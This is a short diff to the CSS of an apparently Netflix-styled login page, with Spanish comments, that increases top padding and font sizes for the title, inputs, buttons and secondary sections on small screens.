@@ -188,10 +188,20 @@
             body {
                 background-image: url('https://assets.nflxext.com/ffe/siteui/vlv3/258d0f77-2241-4282-b613-8354a7675d1a/web/EC-es-20250721-TRIFECTA-perspective_46610579-3b5e-43fd-a42d-654cdb8ada4d_small.jpg');
                 align-items: flex-start;
-                padding-top: 60px;
+                padding-top: 80px; /* Incrementado para más espacio en la parte superior */
             }
             .login-container {
-                margin: 0 10px; /* Reducir márgenes laterales */
+                margin: 0 10px; /* Centrado y con márgenes laterales */
+            }
+            /* Aumentar el tamaño de la fuente para mejor legibilidad */
+            .login-title {
+                font-size: 1.8em;
+            }
+            .form-group input, .login-btn, .login-code-btn {
+                font-size: 16px;
+            }
+            .remember-help-flex, .signup-section, .recaptcha-section {
+                font-size: 0.9em;
             }
         }
     </style>
